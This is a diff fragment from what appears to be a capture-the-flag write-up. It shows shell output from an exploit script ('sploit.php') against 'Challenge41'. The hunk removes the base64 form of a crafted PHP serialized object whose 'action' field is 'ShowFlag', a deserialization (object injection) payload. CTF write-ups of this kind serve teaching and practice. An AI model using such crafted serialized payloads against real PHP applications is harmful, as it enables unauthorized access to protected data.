@@ -102,9 +102,4 @@ root@kali:~/Challenge41# php sploit.php | hexdump -C
 00000080  3a 22 53 68 6f 77 46 6c  61 67 22 3b 7d 7d        |:"ShowFlag";}}|
 0000008e
 
-root@kali:~/Challenge41# php sploit.php | base64
-TzoxMToiUmFuZG9tQ2xhc3MiOjE6e3M6MjA6IgBSYW5kb21DbGFzcwB1U3RydWN0IjtPOjg6InN0
-ZENsYXNzIjozOntzOjQ6InRpbWUiO3M6MToiMSI7czo0OiJmbGFnIjtzOjc6IlBsZWFzZT8iO3M6
-NjoiYWN0aW9uIjtzOjg6IlNob3dGbGFnIjt9fQ==
-
 {% endhighlight %}
